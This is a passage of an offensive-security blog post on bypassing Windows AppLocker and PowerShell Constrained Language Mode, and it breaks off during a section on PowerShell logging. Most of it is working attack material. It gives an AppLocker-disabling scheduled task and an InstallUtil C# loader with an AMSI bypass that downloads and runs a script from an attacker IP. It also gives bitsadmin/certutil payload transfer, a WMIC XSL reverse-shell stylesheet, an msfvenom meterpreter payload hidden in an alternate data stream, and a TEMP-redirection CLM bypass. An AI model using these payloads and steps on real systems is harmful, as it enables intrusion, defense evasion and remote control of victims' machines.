href=\"https://devblogs.microsoft.com/powershell/a-comparison-of-shell-and-scripting-language-security/\">language mode</a> of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs , So why this for ?</p>\n<p>Because it‚Äôs an incredibly effective way to drastically reduce the risk of viruses, ransomware, and unapproved software. For DeviceGuard UMCI the approved applications are determined via a UMCI policy. PowerShell automatically detects when a UMCI policy is being enforced on a system and will run only in Constrained Language mode. So PowerShell Constrained Language mode becomes more interesting when working in conjunction with system-wide lockdown policies.</p>\n<blockquote>\n<p>Local Account Syntax: The general syntax for logging in with a local account is <code>.\\username</code><br>{: .prompt-tip }</p>\n</blockquote>\n<p>Now we know what is Applocker &amp; PowerShell Constrained Language Mode let‚Äôs see how to use them, I need you to follow this <a href=\"https://www.hackingarticles.in/windows-applocker-policy-a-beginners-guide/\">guide</a></p>\n<p>Let‚Äôs setup our enviroment :</p>\n<p>First we need to configure the Applocker policy from LocalGroupPolicy -&gt; Computer Configration -&gt; Windows Settings -&gt; Security Settings -&gt; Application Control Policies -&gt; AppLocker</p>\n<p>Then i need you to follow the pervious blog and create 2 rules :</p>\n<ul>\n<li>Rule Path to run only executables from the C:\\Windows*</li>\n<li>block the <a href=\"https://github.com/int0x33/nc.exe/blob/master/nc64.exe\">nc64.exe</a> by the hash</li>\n</ul>\n<p>Then generate the default creds for the Script Rules to apply the Constrained Language Mode</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def13.png\" alt=\"\"></figure>\n\n\n<p>If you follow the rules you should see something like this !</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def15.png\" alt=\"\"></figure>\n\n<blockquote>\n<p>This is from <a href=\"https://patchmypc.com/blog/windows-11-24h2-applocker-powershell-constrained-language-broken/\">Rudy Ooms</a> :</p>\n<p>But How PowerShell Determines Language Mode Based on AppLocker Script Rules ??</p>\n<p>When PowerShell starts, it checks whether <a href=\"https://call4cloud.nl/deploying-applocker-intune-powershell/\">AppLocker Script Enforcement</a> Rules are present. It does this by simulating the execution of a test PowerShell script placed in the user‚Äôs temporary folder and evaluating it against the system‚Äôs policies. As shown below, the DLL (System.Management.Automation.dll) responsible for PowerShell shows this behavior.</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def16.png\" alt=\"\"></figure>\nThis means that if AppLocker‚Äôs rules block or restrict the test PS1 file, PowerShell automatically switches into Constrained Language Mode.\n<figure><img src=\"/images/site/posts/DefenseEvasion/def17.png\" alt=\"\"></figure>\nIf no restrictions apply, PowerShell Scripts will be executed in full language mode. This automatic detection has worked reliably for years and has been a simple way to enforce script safety without needing extra configuration inside PowerShell itself.<p>{: .prompt-tip }</p>\n</blockquote>\n<p>But is this a good security approach , It depends on the quality of the rules we are implementing</p>\n<p>Can you disable the Applocker ? ( <strong>Matio here is an administrator</strong> )</p>\n<p>For the first look you can say yes if we are an administrators but seems it doesn‚Äôt work like this</p>\n<p>Let‚Äôs first talk about the PPL (Protected Process Light) : The PLL is a security feature in Windows that protects critical system processes like antivirus engines, security services, and system integrity components from being <strong>tampered with</strong>, even by <strong>administrators or SYSTEM-level accounts</strong>.</p>\n<p>So Let‚Äôs try to disable the AppLocker</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def18.png\" alt=\"\"></figure>\n\n<p>Even with the System account</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def19.png\" alt=\"\"></figure>\n\n<blockquote>\n<p>By the way  <a href=\"https://www.tiraniddo.dev/2019/11/the-internals-of-applocker-part-1.html\">tiraniddo</a> here found a way to disable the AppLocker with the TrustedInstaller account :</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"built_in\">New-ScheduledTaskAction</span> <span class=\"literal\">-Execute</span> cmd.exe <span class=\"literal\">-Argument</span> <span class=\"string\">&quot;/C sc.exe config appidsvc start= demand &amp;&amp; sc.exe stop appidsvc&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Register-ScheduledTask</span> <span class=\"literal\">-TaskName</span> <span class=\"string\">&#x27;TestTask&#x27;</span> <span class=\"literal\">-TaskPath</span> \\ <span class=\"literal\">-Action</span> <span class=\"variable\">$a</span></span><br><span class=\"line\"><span class=\"variable\">$svc</span> = <span class=\"built_in\">New-Object</span> <span class=\"literal\">-ComObject</span> <span class=\"string\">&#x27;Schedule.Service&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$svc</span>.Connect()</span><br><span class=\"line\"><span class=\"variable\">$user</span> = <span class=\"string\">&#x27;NT SERVICE\\TrustedInstaller&#x27;</span></span><br><span class=\"line\"><span class=\"variable\">$folder</span> = <span class=\"variable\">$svc</span>.GetFolder(<span class=\"string\">&#x27;\\&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable\">$task</span> = <span class=\"variable\">$folder</span>.GetTask(<span class=\"string\">&#x27;TestTask&#x27;</span>)</span><br><span class=\"line\"><span class=\"variable\">$task</span>.RunEx(<span class=\"variable\">$null</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"variable\">$user</span>)</span><br></pre></td></tr></table></figure><p>{: .prompt-tip }</p>\n</blockquote>\n<h3 id=\"Path-Hash-restrictions-bypass\"><a href=\"#Path-Hash-restrictions-bypass\" class=\"headerlink\" title=\"Path &#x2F; Hash restrictions bypass\"></a>Path &#x2F; Hash restrictions bypass</h3><p>In this scenario, i will show you how we can bypass the Path &#x2F; Hash restrictions by moving the file to an allowed executable path and changing the file wish to lead to changing the whole hash</p>\n<p>First we will see what directories that our permession to the subdirectories of the main dir that we can run exe files from it</p>\n<p>Then we will edit the file hash , Seems this will make will work</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">Get-ChildItem</span> C:\\Windows\\ <span class=\"literal\">-Directory</span> <span class=\"literal\">-Recurse</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue | <span class=\"built_in\">ForEach-Object</span> &#123; <span class=\"variable\">$dir</span> = <span class=\"variable\">$_</span>; <span class=\"keyword\">try</span> &#123; (<span class=\"built_in\">Get-Acl</span> <span class=\"variable\">$dir</span>.FullName <span class=\"literal\">-ErrorAction</span> SilentlyContinue).Access | <span class=\"built_in\">Where-Object</span> &#123; <span class=\"variable\">$_</span>.AccessControlType <span class=\"operator\">-eq</span> <span class=\"string\">&quot;Allow&quot;</span> <span class=\"operator\">-and</span> (<span class=\"variable\">$_</span>.IdentityReference.Value <span class=\"operator\">-eq</span> <span class=\"string\">&quot;NT AUTHORITY\\Authenticated Users&quot;</span> <span class=\"operator\">-or</span> <span class=\"variable\">$_</span>.IdentityReference.Value <span class=\"operator\">-eq</span> <span class=\"string\">&quot;BUILTIN\\Users&quot;</span>) <span class=\"operator\">-and</span> ((<span class=\"variable\">$_</span>.FileSystemRights <span class=\"operator\">-like</span> <span class=\"string\">&quot;*Write*&quot;</span> <span class=\"operator\">-or</span> <span class=\"variable\">$_</span>.FileSystemRights <span class=\"operator\">-like</span> <span class=\"string\">&quot;*Create*&quot;</span>) <span class=\"operator\">-and</span> <span class=\"variable\">$_</span>.FileSystemRights <span class=\"operator\">-like</span> <span class=\"string\">&quot;*Execute*&quot;</span>) &#125; | <span class=\"built_in\">ForEach-Object</span> &#123; <span class=\"built_in\">Write-Host</span> (<span class=\"variable\">$dir</span>.FullName + <span class=\"string\">&quot;: &quot;</span> + <span class=\"variable\">$_</span>.IdentityReference.Value + <span class=\"string\">&quot; (&quot;</span> + <span class=\"variable\">$_</span>.FileSystemRights + <span class=\"string\">&quot;)&quot;</span>) &#125; &#125; <span class=\"keyword\">catch</span> &#123;&#125; &#125;</span><br><span class=\"line\">C:\\Windows\\Tasks: NT AUTHORITY\\Authenticated Users (CreateFiles, ReadAndExecute, Synchronize)</span><br><span class=\"line\">C:\\Windows\\tracing: BUILTIN\\Users (<span class=\"built_in\">Write</span>, ReadAndExecute, Synchronize)</span><br><span class=\"line\">C:\\Windows\\System32\\spool\\drivers\\color: BUILTIN\\Users (CreateFiles, ReadAndExecute, Synchronize)</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">cp</span> .\\Downloads\\nc64.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; &amp; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\">Program <span class=\"string\">&#x27;nc64.exe&#x27;</span> failed to run: This program is blocked by <span class=\"built_in\">group</span> policy. <span class=\"keyword\">For</span> more information, contact your system</span><br><span class=\"line\">administratorAt line:<span class=\"number\">1</span> char:<span class=\"number\">1</span></span><br><span class=\"line\">+ &amp; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.</span><br><span class=\"line\">At line:<span class=\"number\">1</span> char:<span class=\"number\">1</span></span><br><span class=\"line\">+ &amp; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class=\"line\">    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException</span><br><span class=\"line\">    + FullyQualifiedErrorId : NativeCommandFailed</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;N1NJ10&quot;</span> &gt;&gt; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe</span><br><span class=\"line\"><span class=\"built_in\">PS</span> C:\\Users\\matio&gt; &amp; C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe <span class=\"literal\">-l</span> <span class=\"literal\">-p</span> <span class=\"number\">7777</span></span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def20.png\" alt=\"\"></figure>\n\n\n<h3 id=\"InstallUtil-Shell-Updated-Part\"><a href=\"#InstallUtil-Shell-Updated-Part\" class=\"headerlink\" title=\"InstallUtil - Shell ( Updated Part )\"></a>InstallUtil - Shell ( Updated Part )</h3><p>There is a bypass technique that usess the <a href=\"https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool\">Installutil</a> , My first time to see it from <a href=\"https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/\">pentestlab</a> i reccomed u to read this before contiue</p>\n<p>As we know now , when can use installutil to run an exe files inside them to bypass the applocker rules ( Since this utility is a <span style=\"color:yellow\">Microsoft signed binary</span> then it could be used to run any .NET executables bypassing in that way AppLocker restrictions. Also this utility is <span style=\"color:yellow\">located inside the Windows directory</span> which AppLocker policies are not going to be applied as the contents of the Windows folder are needed to be executed in order for the system to run normally ) and bypass the CLM lang ( InstallUtil <span style=\"color:yellow\">executes the code in a .NET context, not PowerShell, avoiding CLM restrictions</span>. ) , okey let‚Äôs see how we can exploit this using this code</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation.Runspaces;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Configuration.Install;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace BypassCLM</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">static</span> void Main(string[] args)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Console.WriteLine(<span class=\"string\">&quot;This is vairous , ru kidding !!!! &quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    [<span class=\"type\">System.ComponentModel.RunInstaller</span>(<span class=\"type\">true</span>)]</span><br><span class=\"line\">    public <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sample</span> : <span class=\"title\">System</span>.<span class=\"title\">Configuration</span>.<span class=\"title\">Install</span>.<span class=\"title\">Installer</span></span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        public override void Uninstall(System.Collections.IDictionary savedState)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">           string amsiBypass = <span class=\"string\">@&quot;[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;).GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).SetValue(<span class=\"variable\">$null</span>,<span class=\"variable\">$true</span>)&quot;;</span></span><br><span class=\"line\"><span class=\"string\">           string cmd = &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.99.21:8080/a9kMET&#x27;)&quot;;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">           Runspace rs = RunspaceFactory.CreateRunspace();</span></span><br><span class=\"line\"><span class=\"string\">           rs.Open();</span></span><br><span class=\"line\"><span class=\"string\">           PowerShell ps = PowerShell.Create();</span></span><br><span class=\"line\"><span class=\"string\">           ps.Runspace = rs;</span></span><br><span class=\"line\"><span class=\"string\">           ps.AddScript(amsiBypass); // First, bypass AMSI</span></span><br><span class=\"line\"><span class=\"string\">           ps.Invoke();</span></span><br><span class=\"line\"><span class=\"string\">           ps.AddScript(cmd); // Then, execute the downloaded script</span></span><br><span class=\"line\"><span class=\"string\">           ps.Invoke();</span></span><br><span class=\"line\"><span class=\"string\">           rs.Close();</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>Create ur reverse shell and change the cmd variable ( u can do it with metasploit or any other c2 ) and the amsiBypass also , Then compile it with the .Net <a href=\"https://dotnet.microsoft.com/en-us/download/dotnet-framework\">csc.exe</a> binary</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.<span class=\"number\">0.30319</span>\\csc.exe /reference:<span class=\"string\">&quot;C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll&quot;</span> /out:Bypass.exe BypassCLM.cs</span><br><span class=\"line\">certutil <span class=\"literal\">-encode</span> Bypass.exe bypass.txt</span><br></pre></td></tr></table></figure>\n\n<p>Then run your <a href=\"https://github.com/danvk/RangeHTTPServer\">RangeHTTPServer</a> ( <strong>Not http</strong> )</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m RangeHTTPServer 1234</span><br></pre></td></tr></table></figure>\n\n<p>Then go to your victum and excute those commands</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bitsadmin /transfer Bad_Work http://<span class=\"number\">192.168</span>.<span class=\"number\">99.21</span>/bypass.txt C:\\Windows\\System32\\spool\\drivers\\color\\bypass.txt</span><br><span class=\"line\">certutil <span class=\"literal\">-decode</span> C:\\Windows\\System32\\spool\\drivers\\color\\bypass.txt C:\\Windows\\System32\\spool\\drivers\\color\\bypass.exe</span><br><span class=\"line\">&amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.<span class=\"number\">0.30319</span>\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\System32\\spool\\drivers\\color\\bypass.exe</span><br></pre></td></tr></table></figure>\n\n<p>If you follow those steps you should get the shell</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def21.png\" alt=\"\"></figure>\n\n\n<h3 id=\"WMIC-Updated-Part\"><a href=\"#WMIC-Updated-Part\" class=\"headerlink\" title=\"WMIC ( Updated Part )\"></a>WMIC ( Updated Part )</h3><p>There is a small trick when u can use a wmic to bypass this restrictions , I try this one on a ctf on hackthebox you can use this xsl file ( Change the reverse shell ) :</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&#x27;1.0&#x27;</span>?&gt;</span><br><span class=\"line\">&lt;stylesheet version=<span class=\"string\">&quot;1.0&quot;</span></span><br><span class=\"line\">xmlns=<span class=\"string\">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class=\"line\">xmlns:ms=<span class=\"string\">&quot;urn:schemas-microsoft-com:xslt&quot;</span></span><br><span class=\"line\">xmlns:user=<span class=\"string\">&quot;http://mycompany.com/mynamespace&quot;</span>&gt;</span><br><span class=\"line\">&lt;output method=<span class=\"string\">&quot;text&quot;</span>/&gt;</span><br><span class=\"line\">        &lt;ms:script implements<span class=\"literal\">-prefix</span>=<span class=\"string\">&quot;user&quot;</span> language=<span class=\"string\">&quot;JScript&quot;</span>&gt;</span><br><span class=\"line\">                &lt;![<span class=\"type\">CDATA</span>[</span><br><span class=\"line\">                        <span class=\"type\">var</span> <span class=\"type\">r</span> = <span class=\"type\">new</span> <span class=\"type\">ActiveXObject</span>(<span class=\"string\">&quot;WScript.Shell&quot;</span>);</span><br><span class=\"line\">                        <span class=\"type\">r.Run</span>(<span class=\"string\">&quot;powershell.exe -nop -w hidden -e xxxxxxxxxxxxxxxxxx=&quot;</span>);</span><br><span class=\"line\">                ]]&gt;</span><br><span class=\"line\">        &lt;/ms:script&gt;</span><br><span class=\"line\">&lt;/stylesheet&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Then you can get the file from the server or download and excute it</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">wmic <span class=\"keyword\">process</span> get brief /format:<span class=\"string\">&quot;rev.xsl&quot;</span></span><br><span class=\"line\">wmic <span class=\"keyword\">process</span> get brief /format:<span class=\"string\">&quot;http://192.168.99.21:1234/rev.xsl&quot;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>There is more ways you can test from here :</p>\n<ul>\n<li><a href=\"https://ppn.snovvcra.sh/pentest/infrastructure/ad/av-edr-evasion/applocker-bypass\">snovvcra.sh</a></li>\n<li><a href=\"https://itm4n.github.io/reinventing-powershell/#constrained-language-mode-clm\">itm4n</a></li>\n<li><a href=\"https://github.com/api0cradle/UltimateAppLockerByPassList\">UltimateAppLockerByPassList</a><br>{: .prompt-tip }</li>\n</ul>\n</blockquote>\n<h3 id=\"Alternate-Data-Stream\"><a href=\"#Alternate-Data-Stream\" class=\"headerlink\" title=\"Alternate Data Stream\"></a>Alternate Data Stream</h3><p><a href=\"https://owasp.org/www-community/attacks/Windows_alternate_data_stream\">OWASP</a> said The NTFS file system includes support for alternate data streams. This is not a well known feature and was included, primarily, to provide compatibility with files in the Macintosh file system. Alternate data streams allow files to contain more than one stream of data. Every file has at least one data stream. In Windows, this default data stream is called <code>:$DATA</code></p>\n<p>So we can hide a data stream in any file without the user even konw !!</p>\n<p>So let‚Äôs first create our reverse shell</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.21 LPORT=7771 -a x64 --platform Windows -f exe -o rev_shell.exe</span><br></pre></td></tr></table></figure>\n\n<p>Then transfer the file to the victum machine and embaded it into another file ( <strong>Run this from the cmd</strong> )</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">type</span> C:\\Users\\matio\\Desktop\\rev_shell.exe &gt; <span class=\"string\">&quot;C:\\Users\\matio\\Desktop\\test.txt -Stream rev_shell.exe&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">wmic <span class=\"keyword\">process</span> call create <span class=\"string\">&#x27;&quot;test.txt:rev_shell.exe&quot;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>Then it should be worked.</p>\n<h2 id=\"Powershell-CLM-Bypass\"><a href=\"#Powershell-CLM-Bypass\" class=\"headerlink\" title=\"Powershell CLM Bypass\"></a>Powershell CLM Bypass</h2><p>Let‚Äôs see if we can bypass the CLM , First let‚Äôs see the LanguageMode we are using</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def22.png\" alt=\"\"></figure>\n\n<p>There is more than a way to Bypass the CLM</p>\n<h3 id=\"PowerShdll\"><a href=\"#PowerShdll\" class=\"headerlink\" title=\"PowerShdll\"></a>PowerShdll</h3><p>we can Run PowerShell with rundll32. Bypass software restrictions using <a href=\"https://github.com/p3nt4/PowerShdll\">PowerShdll</a>, so Let‚Äôs see</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bitsadmin /transfer Bad_Work http://<span class=\"number\">192.168</span>.<span class=\"number\">99.21</span>:<span class=\"number\">1234</span>/PowerShdll_x64.dll C:\\Windows\\System32\\spool\\drivers\\color\\PowerShdll_x64.dl</span><br><span class=\"line\">rundll32.exe PowerShdll_x64.dll,main <span class=\"literal\">-w</span></span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def23.png\" alt=\"\"></figure>\n\n<blockquote>\n<p>You can try some other tools like <a href=\"https://github.com/padovah4ck/PSByPassCLM\">PSByPassCLM</a> or <a href=\"https://github.com/calebstewart/bypass-clm\">bypass-clm</a><br>{: .prompt-tip }</p>\n</blockquote>\n<h3 id=\"TEMP-ORARY-Updated-Part\"><a href=\"#TEMP-ORARY-Updated-Part\" class=\"headerlink\" title=\"%TEMP%ORARY ( Updated Part )\"></a>%TEMP%ORARY ( Updated Part )</h3><p>One of the catchy methods to bypass the CLM language in powershell is this method</p>\n<p>Remmeber in the beggening of talking about the CLM i leave you with an important note by Rudy Ooms [ When PowerShell starts, it checks whether <a href=\"https://call4cloud.nl/deploying-applocker-intune-powershell/\"><strong>AppLocker Script Enforcement</strong></a> Rules are present. It does this by simulating the execution of a test <strong>PowerShell script placed in the user‚Äôs temporary</strong> folder and evaluating it against the system‚Äôs policies. ] so why this important ?</p>\n<p>By focus on this statment we should understand that , when a user open the powershell for the first time the system made a random powershell script in his temp dir ( Which are not in the dirs that can execute any binaries or powershell scripts ) and see if this user can execute this script or not</p>\n<p>If yes okey make him in the FullLanguage mode if not change the language mode to ConstrainedLanguage , Okey what if we change the user temp dir in the enviroment to path that we have access and this path in the dirs that applocker permit them to run the executables and scripts from ( Like we do in the applocker bypass ) and start a new powershell session with those new env variables ?</p>\n<p>This was <a href=\"http://oddvar.moe/2018/10/06/temporary-constrained-language-mode-in-applocker/\">Oddvar</a> idea so he make this script , let‚Äôs test it and see if this sucess or not</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$CurrTemp</span> = <span class=\"variable\">$env:temp</span></span><br><span class=\"line\"><span class=\"variable\">$CurrTmp</span> = <span class=\"variable\">$env:tmp</span></span><br><span class=\"line\"><span class=\"variable\">$TEMPBypassPath</span> = <span class=\"string\">&quot;C:\\windows\\temp&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$TMPBypassPath</span> = <span class=\"string\">&quot;C:\\windows\\temp&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&#x27;hkcu:\\Environment&#x27;</span> <span class=\"literal\">-Name</span> Tmp <span class=\"literal\">-Value</span> <span class=\"string\">&quot;<span class=\"variable\">$TEMPBypassPath</span>&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&#x27;hkcu:\\Environment&#x27;</span> <span class=\"literal\">-Name</span> Temp <span class=\"literal\">-Value</span> <span class=\"string\">&quot;<span class=\"variable\">$TMPBypassPath</span>&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Invoke-WmiMethod</span> <span class=\"literal\">-Class</span> win32_process <span class=\"literal\">-Name</span> create <span class=\"literal\">-ArgumentList</span> <span class=\"string\">&quot;powershell&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">sleep</span> <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Set it back</span></span><br><span class=\"line\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&#x27;hkcu:\\Environment&#x27;</span> <span class=\"literal\">-Name</span> Tmp <span class=\"literal\">-Value</span> <span class=\"variable\">$CurrTmp</span></span><br><span class=\"line\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&#x27;hkcu:\\Environment&#x27;</span> <span class=\"literal\">-Name</span> Temp <span class=\"literal\">-Value</span> <span class=\"variable\">$CurrTemp</span></span><br><span class=\"line\"></span><br><span class=\"line\">OR the Cool one by Matt Graeber Note -&gt; https://posts.specterops.io/bypassing<span class=\"literal\">-application-whitelisting-with-runscripthelper-exe-1906923658fc</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Path to Powershell</span></span><br><span class=\"line\"><span class=\"variable\">$CMDLine</span> = <span class=\"string\">&quot;<span class=\"variable\">$PSHOME</span>\\powershell.exe&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Getting existing env vars</span></span><br><span class=\"line\">[<span class=\"built_in\">String</span>[]] <span class=\"variable\">$EnvVarsExceptTemp</span> = <span class=\"built_in\">Get-ChildItem</span> Env:\\* <span class=\"literal\">-Exclude</span> <span class=\"string\">&quot;TEMP&quot;</span>,<span class=\"string\">&quot;TMP&quot;</span>| % &#123; <span class=\"string\">&quot;<span class=\"variable\">$</span>(<span class=\"variable\">$_</span>.Name)=<span class=\"variable\">$</span>(<span class=\"variable\">$_</span>.Value)&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Custom TEMP and TMP</span></span><br><span class=\"line\"><span class=\"variable\">$TEMPBypassPath</span> = <span class=\"string\">&quot;Temp=C:\\windows\\temp&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$TMPBypassPath</span> = <span class=\"string\">&quot;TMP=C:\\windows\\temp&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Add the to the list of vars</span></span><br><span class=\"line\"><span class=\"variable\">$EnvVarsExceptTemp</span> += <span class=\"variable\">$TEMPBypassPath</span></span><br><span class=\"line\"><span class=\"variable\">$EnvVarsExceptTemp</span> += <span class=\"variable\">$TMPBypassPath</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Define the start params</span></span><br><span class=\"line\"><span class=\"variable\">$StartParamProperties</span> = <span class=\"selector-tag\">@</span>&#123; EnvironmentVariables = <span class=\"variable\">$EnvVarsExceptTemp</span> &#125;</span><br><span class=\"line\"><span class=\"variable\">$StartParams</span> = <span class=\"built_in\">New-CimInstance</span> <span class=\"literal\">-ClassName</span> Win32_ProcessStartup <span class=\"literal\">-ClientOnly</span> <span class=\"literal\">-Property</span> <span class=\"variable\">$StartParamProperties</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Start a new powershell using the new params</span></span><br><span class=\"line\"><span class=\"built_in\">Invoke-CimMethod</span> <span class=\"literal\">-ClassName</span> Win32_Process <span class=\"literal\">-MethodName</span> Create <span class=\"literal\">-Arguments</span> <span class=\"selector-tag\">@</span>&#123;</span><br><span class=\"line\">CommandLine = <span class=\"variable\">$CMDLine</span></span><br><span class=\"line\">ProcessStartupInformation = <span class=\"variable\">$StartParams</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def24.png\" alt=\"\"></figure>\n\n<h2 id=\"PowerShell-Logging\"><a href=\"#PowerShell-Logging\" class=\"headerlink\" title=\"PowerShell Logging\"></a>PowerShell Logging</h2><p>PowerShell logging is the process of recording activities within PowerShell sessions, such as commands executed, scripts run, and their outputs or execution details. It is designed to support auditing, debugging, and security monitoring in Windows environments. The three primary logging types : </p>\n<ul>\n<li>Transcription</li>\n<li>Script Block Logging</li>\n<li>Module Logging</li>\n</ul>\n<p>Each serves distinct purposes, capturing different levels of detail about PowerShell activities, so let us talk about them and their bypasses and how to configure them.</p>\n<h3 id=\"PowerShell-Transcription\"><a href=\"#PowerShell-Transcription\" class=\"headerlink\" title=\"PowerShell Transcription\"></a>PowerShell Transcription</h3><p>The Transcription loging records both input (commands typed) and output (responses shown) of PowerShell sessions, like a session transcript.</p>\n<p>Let‚Äôs configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to PowerShell Transcription</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def25.png\" alt=\"\"></figure>\n\n<p>Let‚Äôs see how this work , you can run this script to know the Transcription are on or not</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$transcriptionSettings</span> = <span class=\"built_in\">Get-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription&quot;</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$transcriptionSettings</span> <span class=\"operator\">-and</span> <span class=\"variable\">$transcriptionSettings</span>.EnableTranscripting <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Transcription logging is 